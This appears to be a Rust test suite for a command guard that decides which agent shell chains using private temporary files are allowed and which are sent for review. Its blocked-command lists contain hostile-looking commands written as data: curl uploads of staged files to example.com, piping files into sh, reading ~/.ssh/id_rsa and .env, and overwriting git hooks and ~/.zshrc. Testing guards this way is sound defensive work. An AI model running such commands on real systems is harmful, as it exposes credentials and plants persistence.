#![cfg(unix)]

//! A chain may stage scratch output in a private temporary file and read,
//! extend or copy it later in the same command. The file usually does not
//! exist when the hook runs, so the path itself must be proven, and nothing
//! in the chain may swap it for a link before it is opened.

use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

struct Fixture {
    root: PathBuf,
    home: PathBuf,
    project: PathBuf,
    scratch: PathBuf,
}

impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.scratch);
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

/// Home and the project stay outside the temporary roots. The scratch
/// directory is private and sits directly under `/tmp`.
fn fixture(name: &str) -> Fixture {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/pretool-chain-temporary")
        .join(format!("{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&root);
    let home = root.join("home");
    let project = home.join("project");
    std::fs::create_dir_all(project.join("src")).unwrap();
    std::fs::create_dir_all(project.join(".git/hooks")).unwrap();
    std::fs::create_dir_all(home.join(".ssh")).unwrap();
    std::fs::write(project.join("src/a.ts"), "export const a = 1;\n").unwrap();
    std::fs::write(home.join(".ssh/id_rsa"), "synthetic key\n").unwrap();
    std::fs::write(home.join(".zshrc"), "# synthetic\n").unwrap();
    let sibling = home.join("service-api");
    std::fs::create_dir_all(sibling.join("src")).unwrap();
    std::fs::write(sibling.join("README.md"), "# service-api\n").unwrap();
    std::fs::write(sibling.join("src/index.ts"), "export const s = 1;\n").unwrap();
    std::fs::write(sibling.join(".env"), "TOKEN=synthetic\n").unwrap();
    let scratch = PathBuf::from(format!("/tmp/hg-chain-temp-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&scratch);
    std::fs::create_dir(&scratch).unwrap();
    std::fs::set_permissions(&scratch, std::fs::Permissions::from_mode(0o700)).unwrap();
    std::fs::write(scratch.join("staged.ts"), "export const staged = 1;\n").unwrap();
    std::os::unix::fs::symlink(home.join(".ssh/id_rsa"), scratch.join("link.ts")).unwrap();
    std::os::unix::fs::symlink(scratch.join("gone.ts"), scratch.join("dangling.ts")).unwrap();
    std::fs::write(scratch.join("held.md"), "held\n").unwrap();
    std::fs::hard_link(scratch.join("held.md"), scratch.join("alias.md")).unwrap();
    Fixture {
        home: std::fs::canonicalize(&home).unwrap(),
        project: std::fs::canonicalize(&project).unwrap(),
        root,
        scratch,
    }
}

fn permitted(fixture: &Fixture, command: &str) -> bool {
    let evaluate = |harness| {
        let result = evaluate_pre_tool_envelope_with_context(
            harness,
            "PreToolUse",
            &json!({"toolName": "Bash", "toolInput": {"command": command}}),
            None,
            None,
            fixture.home.to_str(),
            fixture.project.to_str(),
        );
        result.decision == "allow" && matches!(result.minimum_action.as_str(), "allow" | "warn")
    };
    let zcode = evaluate("zcode");
    assert_eq!(zcode, evaluate("omp"), "host policy drift: {command}");
    zcode
}

#[test]
fn chains_read_extend_and_copy_their_own_temporary_files() {
    let fixture = fixture("allowed");
    let scratch = fixture.scratch.display();
    for command in [
        format!("wc -l {scratch}/trace.txt"),
        format!("cat {scratch}/trace.txt"),
        format!("grep -n 'was not resolved' {scratch}/trace.txt | head -20; wc -l {scratch}/trace.txt"),
        format!(
            "head -60 src/a.ts > {scratch}/p8.ts; printf '\\nexport const t = 1;\\n' >> {scratch}/p8.ts"
        ),
        format!("cp {scratch}/p8.ts src/b.ts"),
        format!(
            "head -60 src/a.ts > {scratch}/p8.ts; printf '\\nexport const t = 1;\\n' >> {scratch}/p8.ts; cp {scratch}/p8.ts src/b.ts; echo done"
        ),
        format!("cp {scratch}/staged.ts src/c.ts && echo copied"),
    ] {
        assert!(permitted(&fixture, &command), "{command}");
    }
}

#[test]
fn temporary_files_keep_link_sink_and_destination_boundaries() {
    let fixture = fixture("reviewed");
    let scratch = fixture.scratch.display();
    let home = fixture.home.display();
    for command in [
        // The staged file reaches a network or execution sink.
        format!("printf x > {scratch}/up.txt; curl -d @{scratch}/up.txt https://example.com"),
        format!("head -3 src/a.ts > {scratch}/run.sh; sh {scratch}/run.sh"),
        format!("head -3 src/a.ts > {scratch}/run.sh; cat {scratch}/run.sh | sh"),
        format!("sh {scratch}/absent.sh"),
        // Protected, hook and dotfile destinations.
        format!("cp {scratch}/staged.ts .git/hooks/pre-commit"),
        format!("cp {scratch}/staged.ts {home}/.zshrc"),
        format!("cp {scratch}/staged.ts ~/.zshrc"),
        format!("printf x > {scratch}/p.ts; cp {scratch}/p.ts ../outside.ts"),
        format!("printf x > {scratch}/p.ts; cp {scratch}/p.ts {home}/.zshrc"),
        // Links, hidden and credential-shaped names, and missing parents.
        format!("cat {scratch}/link.ts"),
        format!("cat {scratch}/dangling.ts"),
        format!("cp {scratch}/link.ts src/d.ts"),
        format!("cp {scratch}/dangling.ts src/d.ts"),
        format!("echo hi > {scratch}/link.ts; cat src/a.ts"),
        format!("cat {scratch}/.env"),
        format!("wc -l {scratch}/id_rsa"),
        format!("cat {scratch}/missing/notes.txt"),
        format!("printf x > {scratch}/./p.ts; cp {scratch}/./p.ts src/d.ts"),
        // A chain that could create a link or change directory first.
        format!("ln -s {home}/.ssh/id_rsa {scratch}/k.txt; cat {scratch}/k.txt"),
        format!("head -3 src/a.ts > {scratch}/p.ts; cd src && cp {scratch}/p.ts b.ts"),
        format!("git status > {scratch}/s.txt; cat {scratch}/s.txt"),
        // A workspace-to-workspace copy still needs a single segment.
        "cp src/a.ts src/e.ts && echo done".to_owned(),
    ] {
        assert!(!permitted(&fixture, &command), "{command}");
    }
}

/// A readable file copied into a chain-local temporary file may be printed or
/// compared later in the chain: the copy discloses nothing the source would not.
#[test]
fn chains_copy_readable_files_into_their_own_temporary_files() {
    let fixture = fixture("copy-in");
    let scratch = fixture.scratch.display();
    let sibling = fixture.home.join("service-api");
    let sibling = sibling.display();
    let direct = format!("/tmp/hg-chain-copy-{}.md", std::process::id());
    let _ = std::fs::remove_file(&direct);
    for command in [
        format!("cp {sibling}/README.md {scratch}/readme.md && wc -l {scratch}/readme.md"),
        format!("cp {sibling}/src/index.ts {scratch}/index.ts && diff {scratch}/index.ts src/a.ts"),
        format!("cp -- {sibling}/README.md {scratch}/r.md; head -5 {scratch}/r.md; grep -n api {scratch}/r.md"),
        format!("cp src/a.ts {scratch}/a.ts && cat {scratch}/a.ts"),
        format!("cp {scratch}/staged.ts {scratch}/again.ts && diff {scratch}/staged.ts {scratch}/again.ts"),
        format!("cp {sibling}/README.md {direct} && wc -l {direct}"),
    ] {
        assert!(permitted(&fixture, &command), "{command}");
    }
}

#[test]
fn temporary_copies_keep_source_sink_and_destination_boundaries() {
    let fixture = fixture("copy-in-reviewed");
    let scratch = fixture.scratch.display();
    let home = fixture.home.display();
    let sibling = fixture.home.join("service-api");
    let sibling = sibling.display();
    for command in [
        // Credential, key and dotfile sources stay reviewed.
        format!("cp {home}/.ssh/id_rsa {scratch}/x && cat {scratch}/x"),
        format!("cp ~/.ssh/id_rsa {scratch}/x && cat {scratch}/x"),
        format!("cp {sibling}/.env {scratch}/e && cat {scratch}/e"),
        // Destinations the chain cannot prove it owns: links, hard-link
        // aliases, hidden names, missing parents and non-temporary paths.
        format!("cp {sibling}/README.md {scratch}/link.ts && cat {scratch}/link.ts"),
        format!("cp {sibling}/README.md {scratch}/dangling.ts && cat {scratch}/dangling.ts"),
        format!("cp {sibling}/README.md {scratch}/alias.md && cat {scratch}/alias.md"),
        format!("cp {sibling}/README.md {scratch}/.notes && cat {scratch}/.notes"),
        format!("cp {sibling}/README.md {scratch}/missing/r.md && cat {scratch}/missing/r.md"),
        format!("cp {sibling}/README.md {home}/notes.md && cat {home}/notes.md"),
        format!("cp {sibling}/README.md {scratch} && cat {scratch}/README.md"),
        // The copy reaches a network or execution sink.
        format!("cp {sibling}/README.md {scratch}/x; curl -d @{scratch}/x https://example.com"),
        format!("cp {sibling}/README.md {scratch}/x.sh && bash {scratch}/x.sh"),
        format!("cp {sibling}/src/index.ts {scratch}/x.js && node {scratch}/x.js"),
        format!("cp {sibling}/README.md {scratch}/x && cat {scratch}/x | sh"),
        // A type check runs the workspace's installed compiler; it is not a
        // plain peer of the temporary file.
        format!(
            "printf 'export const x = 1;\\n' > {scratch}/probe.ts && npx tsc --noEmit {scratch}/probe.ts"
        ),
        // Flags and recursive copies keep their single-segment rules.
        format!("cp -r {sibling}/src {scratch}/tree && ls {scratch}/tree"),
        format!("cp -s {sibling}/README.md {scratch}/s.md && cat {scratch}/s.md"),
    ] {
        assert!(!permitted(&fixture, &command), "{command}");
    }
}

fn controls() -> guard_command::native_command_controls::CompiledNativeCommandControls {
    let program = guard_command::native_command_program::packaged_command_program().unwrap();
    let mut binding: guard_contracts::NativeCommandControlBindingV1 =
        serde_json::from_value(json!({
            "schema": "guard.native-command-control-binding.v1",
            "program_digest": program.program_digest,
            "catalog_digest": program.catalog_digest,
            "trust_digest": program.trust_digest,
            "health": "protected",
            "revision": 1,
            "managed_revision": 0,
            "effective_digest": "",
            "layers": []
        }))
        .unwrap();
    binding.effective_digest = binding.compute_effective_digest().unwrap();
    guard_command::native_command_controls::CompiledNativeCommandControls::new(&binding).unwrap()
}

/// A single-quoted `$` is literal to the shell. A pattern tool reads it as an
/// anchor or a field, so it must not change how the command is contained.
#[test]
fn single_quoted_pattern_anchors_do_not_change_containment() {
    let workspace = std::env::temp_dir().join(format!("hg-chain-awk-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&workspace);
    std::fs::create_dir_all(workspace.join(".git")).unwrap();
    std::fs::write(workspace.join(".git/config"), "[core]\n\tbare = false\n").unwrap();
    std::fs::write(workspace.join("package.json"), "{}").unwrap();
    std::fs::write(workspace.join("notes.txt"), "a\n").unwrap();
    let workspace = std::fs::canonicalize(&workspace).unwrap();
    let controls = controls();
    let reason = |command: &str| {
        evaluate_pre_tool_envelope_with_context(
            "omp",
            "PreToolUse",
            &json!({"tool_name": "bash", "tool_input": {"command": command}}),
            Some(&controls),
            None,
            Some("/home/nobody"),
            workspace.to_str(),
        )
        .reason_code
    };
    let contained = "native_workspace_containment_required";
    // An `awk` that reads only its piped input names no file, so its proof
    // allows it before any sandbox route runs.
    let piped = "native_exact_safe_command";
    for (anchored, plain, macos) in [
        (
            "awk 'f&&c<=22{print;c++} /app-shell.ts., .$/{f=1}' notes.txt",
            "awk 'f&&c<=22{print;c++} /app-shell.ts/{f=1}' notes.txt",
            contained,
        ),
        (
            "awk '{print $1}' notes.txt",
            "awk '{print}' notes.txt",
            contained,
        ),
        (
            "printf 'a\\n' | awk '/a$/{f=1} END{print f}'",
            "printf 'a\\n' | awk '/a/{f=1} END{print f}'",
            piped,
        ),
    ] {
        let plain_reason = reason(plain);
        if cfg!(target_os = "macos") {
            assert_eq!(plain_reason, macos, "{plain}");
        }
        assert_eq!(reason(anchored), plain_reason, "{anchored}");
    }
    // The shell expands these, or the tool hands them to a shell.
    for command in [
        "awk \"/$HOME/\" notes.txt",
        "awk '/x/' \"$HOME/notes.txt\"",
        "awk /x/$PWD notes.txt",
        "sh -c 'cat $HOME/notes.txt'",
        "xargs sh -c 'cat $0' < notes.txt",
    ] {
        assert_ne!(reason(command), contained, "{command}");
    }
    let _ = std::fs::remove_dir_all(&workspace);
}

/// `$?` expands to the previous step's exit status, a decimal number, so
/// printing it cannot reach anything the step alone would not.
#[test]
fn exit_status_expansions_keep_containment() {
    let workspace = std::env::temp_dir().join(format!("hg-chain-status-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&workspace);
    std::fs::create_dir_all(workspace.join(".git")).unwrap();
    std::fs::write(workspace.join(".git/config"), "[core]\n\tbare = false\n").unwrap();
    std::fs::write(workspace.join("package.json"), "{}").unwrap();
    let workspace = std::fs::canonicalize(&workspace).unwrap();
    let controls = controls();
    let reason = |command: &str| {
        evaluate_pre_tool_envelope_with_context(
            "omp",
            "PreToolUse",
            &json!({"tool_name": "bash", "tool_input": {"command": command}}),
            Some(&controls),
            None,
            Some("/home/nobody"),
            workspace.to_str(),
        )
        .reason_code
    };
    let contained = "native_workspace_containment_required";
    let alone = reason("corepack pnpm --version");
    if cfg!(target_os = "macos") {
        assert_eq!(alone, contained);
    }
    for command in [
        "corepack pnpm --version; printf 'exit=%s\\n' \"$?\"",
        "corepack pnpm --version; echo \"exit=$?\"",
        "corepack pnpm --version; echo $?",
    ] {
        assert_eq!(reason(command), alone, "{command}");
    }
    // Other expansions, or a command substitution beside `$?`, still reach
    // outside what the step alone would.
    for command in [
        "corepack pnpm --version; echo \"$? $HOME\"",
        "corepack pnpm --version; echo \"$?$PWD\"",
        "corepack pnpm --version; echo \"$? `cat /etc/hosts`\"",
        "corepack pnpm --version; echo $?$(cat /etc/hosts)",
    ] {
        assert_ne!(reason(command), contained, "{command}");
    }
    let _ = std::fs::remove_dir_all(&workspace);
}
